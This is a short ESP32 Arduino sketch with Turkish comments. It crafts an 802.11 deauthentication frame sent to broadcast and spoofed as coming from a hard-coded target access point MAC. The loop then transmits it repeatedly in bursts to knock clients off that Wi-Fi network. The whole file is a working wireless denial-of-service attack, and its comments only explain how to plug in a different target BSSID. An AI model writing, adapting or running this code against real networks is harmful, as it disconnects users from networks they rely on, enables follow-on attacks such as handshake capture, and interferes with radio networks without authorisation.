#include <WiFi.h>
#include <esp_wifi.h>

uint8_t deauthPacket[26] = {
  /* 0-1 */ 0xc0, 0x00, // Type: Deauth
  /* 2-3 */ 0x3a, 0x01, // Duration
  /* 4-9 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
  /* 10-15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
  /* 16-21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  /* 22-23 */ 0x00, 0x00, // Frag & Seq number
  /* 24-25 */ 0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);

  // Buradan BSSID (hedef ağın MAC adresi) ve hedef MAC adresi ayarlanabilir
  // Örnek: BSSID = 18:3D:A2:EC:32:88
  uint8_t bssid[6] = {0x18, 0x3D, 0xA2, 0xEC, 0x32, 0x88};
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);

  Serial.println("Deauth işlemi başlıyor...");
}

void loop() {
  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(100);
  }
  delay(2000);
}